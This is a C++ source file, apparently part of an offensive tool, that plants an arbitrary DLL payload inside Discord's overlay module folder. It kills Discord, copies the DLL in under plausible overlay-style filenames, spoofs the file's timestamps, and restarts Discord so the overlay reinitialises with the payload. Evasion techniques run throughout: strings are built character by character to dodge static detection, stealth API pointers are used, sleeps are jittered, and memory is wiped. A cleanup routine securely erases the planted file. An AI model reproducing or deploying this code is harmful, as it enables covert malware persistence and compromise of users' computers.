#include "discord_overlay.hpp"
#include "../crypto/crypto.hpp"
#include "../stealth/stealth.hpp"
#include <iostream>
#include <fstream>
#include <shlobj.h>
#include <sstream>
#include <iomanip>
#include <bcrypt.h>
#include <vector>
#include <tlhelp32.h>
#include <shellapi.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

// ============================================================
// Internal state
// ============================================================
static std::wstring g_stagedOverlayPath;
static std::wstring g_discordExePath;   // Cached Discord exe path for restart
static bool g_discordWasRunning = false; // Track if we killed Discord

std::wstring GetStagedOverlayPath() {
    return g_stagedOverlayPath;
}

void SetStagedOverlayPath(const std::wstring& path) {
    g_stagedOverlayPath = path;
}

// ============================================================
// Discord Process Management
// ============================================================

// Build process name strings char-by-char to avoid string table
static std::wstring DiscordProcessName() {
    wchar_t s[] = { 'D','i','s','c','o','r','d','.','e','x','e', 0 };
    std::wstring r(s);
    SecureZeroMemory(s, sizeof(s));
    return r;
}

static std::wstring DiscordUpdateName() {
    wchar_t s[] = { 'U','p','d','a','t','e','.','e','x','e', 0 };
    std::wstring r(s);
    SecureZeroMemory(s, sizeof(s));
    return r;
}

// Check if a process with the given name is running
static bool IsProcessRunning(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = { sizeof(pe) };
    bool found = false;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName.c_str()) == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return found;
}

// Kill all instances of a process by name
static int KillProcessByName(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    int killed = 0;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName.c_str()) == 0) {
                HANDLE hProc = nullptr;
                if (StealthAPI::pOpenProcess) {
                    hProc = StealthAPI::pOpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                } else {
                    hProc = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                }

                if (hProc) {
                    // Capture the exe path before killing (for restart)
                    if (g_discordExePath.empty()) {
                        wchar_t exePath[MAX_PATH] = { 0 };
                        DWORD size = MAX_PATH;
                        if (QueryFullProcessImageNameW(hProc, 0, exePath, &size)) {
                            g_discordExePath = exePath;
                        }
                        SecureZeroMemory(exePath, sizeof(exePath));
                    }

                    if (StealthAPI::pTerminateProcess) {
                        StealthAPI::pTerminateProcess(hProc, 0);
                    } else {
                        TerminateProcess(hProc, 0);
                    }
                    CloseHandle(hProc);
                    killed++;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return killed;
}

bool IsDiscordRunning() {
    std::wstring name = DiscordProcessName();
    bool running = IsProcessRunning(name);
    SecureWipeString(name);
    return running;
}

bool KillDiscord() {
    std::wstring discordName = DiscordProcessName();
    
    if (!IsProcessRunning(discordName)) {
        std::cout << "[*] Discord is not running" << std::endl;
        SecureWipeString(discordName);
        return false;
    }

    g_discordWasRunning = true;
    std::cout << "[+] Terminating Discord processes..." << std::endl;

    int killed = KillProcessByName(discordName);
    SecureWipeString(discordName);

    if (killed > 0) {
        std::cout << "[+] Terminated " << killed << " Discord process(es)" << std::endl;
    }

    // Wait for all Discord processes to fully exit
    std::wstring checkName = DiscordProcessName();
    int waitCount = 0;
    while (IsProcessRunning(checkName) && waitCount < 30) {
        JitteredSleep(200, 400);
        waitCount++;
    }
    SecureWipeString(checkName);

    if (waitCount >= 30) {
        // Force kill with taskkill as fallback
        std::wstring pname = DiscordProcessName();
        std::wstring cmd = L"taskkill /F /IM ";
        cmd += pname;
        cmd += L" /T >nul 2>&1";
        _wsystem(cmd.c_str());
        SecureWipeString(pname);
        SecureWipeString(cmd);
        JitteredSleep(500, 800);
    }

    std::cout << "[+] Discord fully terminated" << std::endl;
    return true;
}

std::wstring FindDiscordExePath() {
    // If we captured it during kill, use that
    if (!g_discordExePath.empty()) {
        return g_discordExePath;
    }

    // Otherwise search common locations
    wchar_t localAppData[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        return L"";
    }

    // Build Update.exe path: %LOCALAPPDATA%/Discord/Update.exe
    wchar_t discordDir[] = { 'D','i','s','c','o','r','d', 0 };
    wchar_t updateExe[] = { 'U','p','d','a','t','e','.','e','x','e', 0 };
    
    std::wstring updatePath = std::wstring(localAppData) + L"\\" + discordDir + L"\\" + updateExe;
    
    SecureZeroMemory(localAppData, sizeof(localAppData));
    SecureZeroMemory(discordDir, sizeof(discordDir));
    SecureZeroMemory(updateExe, sizeof(updateExe));

    DWORD attrs = GetFileAttributesW(updatePath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        return updatePath;
    }

    return L"";
}

bool RestartDiscord() {
    std::wstring exePath = FindDiscordExePath();
    
    if (exePath.empty()) {
        std::cout << "[-] Cannot find Discord executable for restart" << std::endl;
        return false;
    }

    std::cout << "[+] Restarting Discord..." << std::endl;

    // Discord uses Update.exe --processStart Discord.exe to launch
    // If we captured a direct Discord.exe path, use that
    // If it's Update.exe, pass the --processStart flag
    std::wstring updateName = DiscordUpdateName();
    bool isUpdateExe = (exePath.find(updateName) != std::wstring::npos);
    SecureWipeString(updateName);

    HINSTANCE hInst;
    if (isUpdateExe) {
        // Launch via Update.exe --processStart Discord.exe
        wchar_t args[] = { '-','-','p','r','o','c','e','s','s','S','t','a','r','t',' ','D','i','s','c','o','r','d','.','e','x','e', 0 };
        hInst = ShellExecuteW(NULL, L"open", exePath.c_str(), args, NULL, SW_SHOWNORMAL);
        SecureZeroMemory(args, sizeof(args));
    } else {
        hInst = ShellExecuteW(NULL, L"open", exePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    }

    if ((INT_PTR)hInst <= 32) {
        std::cout << "[-] Failed to launch Discord (Error: " << (INT_PTR)hInst << ")" << std::endl;
        return false;
    }

    std::cout << "[+] Discord launch command sent" << std::endl;

    // Wait for Discord to fully initialize (overlay subsystem needs time)
    std::cout << "[+] Waiting for Discord overlay to initialize..." << std::endl;
    
    std::wstring checkName = DiscordProcessName();
    int waitCount = 0;
    bool discordStarted = false;

    // Wait up to 30 seconds for Discord to appear
    while (waitCount < 60) {
        if (IsProcessRunning(checkName)) {
            discordStarted = true;
            break;
        }
        JitteredSleep(400, 600);
        waitCount++;
    }
    SecureWipeString(checkName);

    if (!discordStarted) {
        std::cout << "[-] Discord did not start within timeout" << std::endl;
        return false;
    }

    // Give the overlay subsystem extra time to fully load and lock files
    // Discord needs several seconds after process start to init the overlay
    std::cout << "[+] Discord process detected, waiting for overlay init..." << std::endl;
    JitteredSleep(4000, 6000);

    std::cout << "[+] Discord overlay reinitialized with staged payload" << std::endl;
    return true;
}

// ============================================================
// Discord Installation Discovery
// ============================================================

// Plausible overlay component filenames that blend into Discord's overlay dir
static std::wstring GenerateOverlayFilename() {
    struct NameBuilder {
        static std::wstring Name0() {
            wchar_t s[] = { 'D','i','s','c','o','r','d','O','v','e','r','l','a','y','H','e','l','p','e','r','.','d','l','l', 0 };
            std::wstring r(s);
            SecureZeroMemory(s, sizeof(s));
            return r;
        }
        static std::wstring Name1() {
            wchar_t s[] = { 'o','v','e','r','l','a','y','_','x','6','4','.','d','l','l', 0 };
            std::wstring r(s);
            SecureZeroMemory(s, sizeof(s));
            return r;
        }
        static std::wstring Name2() {
            wchar_t s[] = { 'd','i','s','c','o','r','d','_','o','v','e','r','l','a','y','_','h','o','s','t','.','d','l','l', 0 };
            std::wstring r(s);
            SecureZeroMemory(s, sizeof(s));
            return r;
        }
        static std::wstring Name3() {
            wchar_t s[] = { 'o','v','e','r','l','a','y','_','r','e','n','d','e','r','e','r','.','d','l','l', 0 };
            std::wstring r(s);
            SecureZeroMemory(s, sizeof(s));
            return r;
        }
    };

    BYTE pick;
    NTSTATUS status = BCryptGenRandom(NULL, &pick, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (status != 0) {
        pick = static_cast<BYTE>(GetTickCount64() & 0xFF);
    }

    switch (pick % 4) {
    case 0: return NameBuilder::Name0();
    case 1: return NameBuilder::Name1();
    case 2: return NameBuilder::Name2();
    case 3: return NameBuilder::Name3();
    default: return NameBuilder::Name0();
    }
}

// Search for Discord's overlay directory
// Discord stores overlay modules in:
//   %LOCALAPPDATA%/Discord/app-X.Y.Z/modules/discord_overlay2-N/discord_overlay2/
static std::wstring ScanForOverlayDir(const std::wstring& discordRoot) {
    // Look for app-* directories
    std::wstring searchPath = discordRoot + L"\\app-*";
    
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return L"";
    }

    std::wstring bestAppDir;
    
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            std::wstring dirName(fd.cFileName);
            if (dirName.find(L"app-") == 0) {
                std::wstring candidate = discordRoot + L"\\" + dirName;
                if (bestAppDir.empty() || candidate > bestAppDir) {
                    bestAppDir = candidate;
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    if (bestAppDir.empty()) {
        return L"";
    }

    // Now look for modules/discord_overlay2-*/discord_overlay2/
    std::wstring modulesPath = bestAppDir + L"\\modules\\discord_overlay2-*";
    hFind = FindFirstFileW(modulesPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        // Fallback: try the app directory itself
        return bestAppDir;
    }

    std::wstring overlayModDir;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            std::wstring dirName(fd.cFileName);
            if (dirName.find(L"discord_overlay2") == 0) {
                overlayModDir = bestAppDir + L"\\modules\\" + dirName + L"\\discord_overlay2";
                break;
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    if (!overlayModDir.empty()) {
        DWORD attrs = GetFileAttributesW(overlayModDir.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return overlayModDir;
        }
    }

    return bestAppDir;
}

std::wstring FindDiscordOverlayDir() {
    wchar_t localAppData[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        return L"";
    }

    wchar_t discordName[] = { 'D','i','s','c','o','r','d', 0 };
    std::wstring discordRoot = std::wstring(localAppData) + L"\\" + discordName;
    SecureZeroMemory(discordName, sizeof(discordName));
    SecureZeroMemory(localAppData, sizeof(localAppData));

    DWORD attrs = GetFileAttributesW(discordRoot.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        wchar_t appData[MAX_PATH] = { 0 };
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
            wchar_t dn[] = { 'D','i','s','c','o','r','d', 0 };
            discordRoot = std::wstring(appData) + L"\\" + dn;
            SecureZeroMemory(dn, sizeof(dn));
            SecureZeroMemory(appData, sizeof(appData));

            attrs = GetFileAttributesW(discordRoot.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                return L"";
            }
        } else {
            return L"";
        }
    }

    return ScanForOverlayDir(discordRoot);
}

bool IsDiscordInstalled() {
    std::wstring dir = FindDiscordOverlayDir();
    bool found = !dir.empty();
    SecureWipeString(dir);
    return found;
}

// ============================================================
// Payload Staging (with Discord restart cycle)
// ============================================================

std::wstring StagePayloadAsOverlay(const std::wstring& srcDllPath) {
    // ---- STEP 1: Kill Discord to release file locks ----
    bool wasRunning = KillDiscord();
    
    // Small delay to ensure file handles are released
    JitteredSleep(500, 1000);

    // ---- STEP 2: Find overlay directory and stage payload ----
    std::wstring overlayDir = FindDiscordOverlayDir();
    if (overlayDir.empty()) {
        std::cout << "[-] Discord overlay directory not found" << std::endl;
        // Restart Discord if we killed it
        if (wasRunning) RestartDiscord();
        return L"";
    }

    std::cout << "[+] Discord overlay path acquired" << std::endl;

    // Generate a plausible overlay filename
    std::wstring overlayFilename = GenerateOverlayFilename();
    std::wstring stagedPath = overlayDir + L"\\" + overlayFilename;

    // Check if a file with this name already exists (don't overwrite legit Discord files)
    DWORD attrs = GetFileAttributesW(stagedPath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        // Name collision — add a random suffix
        BYTE suffix[2];
        BCryptGenRandom(NULL, suffix, 2, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        
        std::wstring base = stagedPath.substr(0, stagedPath.length() - 4);
        std::wostringstream oss;
        oss << base << L"_"
            << std::hex << std::uppercase << std::setw(2) << std::setfill(L'0') << static_cast<int>(suffix[0])
            << std::hex << std::uppercase << std::setw(2) << std::setfill(L'0') << static_cast<int>(suffix[1])
            << L".dll";
        stagedPath = oss.str();
        SecureZeroMemory(suffix, sizeof(suffix));
    }

    SecureWipeString(overlayFilename);

    // Copy the source DLL to the staged location
    if (!CopyFileW(srcDllPath.c_str(), stagedPath.c_str(), FALSE)) {
        std::cout << "[-] Failed to stage payload in overlay directory (Error: " << GetLastError() << ")" << std::endl;
        SecureWipeString(overlayDir);
        SecureWipeString(stagedPath);
        if (wasRunning) RestartDiscord();
        return L"";
    }

    // Match file attributes to other Discord files
    SetFileAttributesW(stagedPath.c_str(), FILE_ATTRIBUTE_NORMAL);

    // Spoof timestamps to match the overlay directory
    HANDLE hDir = CreateFileW(overlayDir.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hDir != INVALID_HANDLE_VALUE) {
        FILETIME createTime, accessTime, writeTime;
        if (GetFileTime(hDir, &createTime, &accessTime, &writeTime)) {
            HANDLE hStaged = CreateFileW(stagedPath.c_str(), FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hStaged != INVALID_HANDLE_VALUE) {
                SetFileTime(hStaged, &createTime, &accessTime, &writeTime);
                CloseHandle(hStaged);
            }
        }
        CloseHandle(hDir);
    }

    SecureWipeString(overlayDir);

    std::cout << "[+] Payload staged as overlay component" << std::endl;

    // Track the staged path
    g_stagedOverlayPath = stagedPath;

    // ---- STEP 3: Restart Discord so overlay reinitializes with our DLL ----
    std::cout << "[+] Restarting Discord to reinitialize overlay..." << std::endl;
    if (!RestartDiscord()) {
        std::cout << "[!] Discord restart failed — payload is staged but overlay may not pick it up" << std::endl;
        // Don't fail — the staged path is still valid for direct loading
    } else {
        std::cout << "[+] Discord overlay reinitialized with payload in place" << std::endl;
    }

    return stagedPath;
}

// ============================================================
// Cleanup
// ============================================================

bool CleanupOverlayPayload(const std::wstring& stagedPath) {
    if (stagedPath.empty()) {
        return true;
    }

    std::cout << "[+] Removing overlay-staged payload..." << std::endl;

    // Kill Discord first to release locks on the overlay directory
    bool wasRunning = KillDiscord();
    JitteredSleep(300, 600);

    // Securely delete the staged file
    bool result = SecureDeleteFile(stagedPath);

    if (result) {
        std::cout << "[+] Overlay payload securely erased" << std::endl;
    } else {
        // Try normal delete as fallback
        if (DeleteFileW(stagedPath.c_str())) {
            std::cout << "[+] Overlay payload removed" << std::endl;
            result = true;
        } else {
            std::cout << "[-] Failed to remove overlay payload (Error: " << GetLastError() << ")" << std::endl;
        }
    }

    // Restart Discord cleanly (without our payload)
    if (wasRunning) {
        std::cout << "[+] Restarting Discord (clean)..." << std::endl;
        RestartDiscord();
    }

    g_stagedOverlayPath.clear();

    return result;
}
